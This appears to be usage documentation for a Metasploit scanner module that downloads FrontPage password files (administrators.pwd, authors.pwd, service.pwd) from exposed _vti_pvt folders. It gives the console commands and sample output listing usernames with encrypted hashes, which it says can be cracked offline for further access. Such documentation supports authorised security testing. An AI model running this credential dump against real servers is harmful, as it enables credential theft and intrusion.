## Description
When Microsoft FrontPage is run on a non-IIS web server it creates encrypted password files in the _vti_pvt folder. When this folder is accessible, these files can be downloaded and parsed to obtain encrytped passwords. These encrypted passwords can then be cracked offline and used to gain further access to the server.

Affected Files:

 * administrators.pwd
 * authors.pwd
 * service.pwd

Citations:
 * https://msdn.microsoft.com/en-us/library/cc750050.aspx
 * http://sparty.secniche.org/

## Usage
```
use auxiliary/scanner/http/frontpage_credential_dump
set RHOSTS 10.10.10.10
set TARGETURI about
run
```

## Standard Output
```
msf auxiliary(scanner/http/frontpage_credential_dump) > run

[+] 10.10.10.10 - service.pwd
[+] # -FrontPage-
[+] username:kLAsISPJ8AsaQ

[+] 10.10.10.10 - administrators.pwd
[+] # -FrontPage-
[+] username:wMyvw3d3c1oWU

[+] 10.10.10.10 - authors.pwd
[+] # -FrontPage-
[+] username:wMyvw3d3c1oWU

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Verbose Output
```
msf auxiliary(scanner/http/frontpage_credential_dump) > run

[*] Requesting: /about/_vti_pvt/service.pwd
[*] Found /about/_vti_pvt/service.pwd.
[*] Found FrontPage credentials.
[+] 10.10.10.10 - service.pwd
[+] # -FrontPage-
[+] username:kLAsISPJ8AsaQ

[*] Requesting: /about/_vti_pvt/administrators.pwd
[*] Found /about/_vti_pvt/administrators.pwd.
[*] Found FrontPage credentials.
[+] 10.10.10.10 - administrators.pwd
[+] # -FrontPage-
[+] username:wMyvw3d3c1oWU

[*] Requesting: /about/_vti_pvt/authors.pwd
[*] Found /about/_vti_pvt/authors.pwd.
[*] Found FrontPage credentials.
[+] 10.10.10.10 - authors.pwd
[+] # -FrontPage-
[+] username:wMyvw3d3c1oWU

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
